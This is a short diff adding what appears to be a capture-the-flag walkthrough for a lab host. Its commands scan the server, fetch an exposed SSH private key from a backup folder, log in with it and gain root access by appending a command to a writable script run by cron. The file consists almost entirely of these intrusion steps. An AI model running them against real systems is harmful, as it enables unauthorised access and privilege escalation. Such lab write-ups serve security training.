@@ -1,0 +1,18 @@
+## find the web server and its folders
+nmap -sV 10.10.4.30
+curl -s http://10.10.4.30/
+webscan http://10.10.4.30/
+## the backup folder lists an SSH private key
+curl -s http://10.10.4.30/backup/
+curl -s http://10.10.4.30/backup/id_rsa -o id_rsa
+chmod 600 id_rsa
+## the key signs you in as webadmin, no password
+ssh -i id_rsa -o StrictHostKeyChecking=accept-new webadmin@10.10.4.30
+cat flag.txt
+## root runs a writable script every minute
+ls -l /opt/maint/rotate.sh
+cat /etc/cron.d/maint
+echo 'cp /root/flag.txt /tmp/r.txt; chmod 644 /tmp/r.txt' >> /opt/maint/rotate.sh
+#wait 60
+cat /tmp/r.txt
+exit
